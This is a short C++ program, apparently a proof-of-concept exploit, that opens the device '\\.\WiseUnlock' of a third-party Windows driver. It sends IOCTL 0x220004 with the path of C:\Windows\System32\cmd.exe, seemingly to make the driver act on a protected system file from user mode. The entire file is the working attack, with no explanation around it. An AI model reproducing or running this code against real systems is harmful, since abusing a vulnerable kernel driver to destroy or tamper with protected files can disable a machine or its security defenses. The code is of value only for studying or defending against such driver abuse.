#include <iostream>
#include <Windows.h>
#include <winioctl.h>

#define SymLinkName L"\\\\.\\WiseUnlock"

HANDLE hDevice;


int main(int argc, char* argv[])
{
    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
        system("pause");
        return 0;
    }

    DWORD dwWrite;
    WCHAR data[0x100] = L"\\??\\C:\\Windows\\System32\\cmd.exe";
    DeviceIoControl(hDevice, 0x220004, data, 0x100, NULL, 0, &dwWrite, NULL);

    system("pause");
    return 0;
}
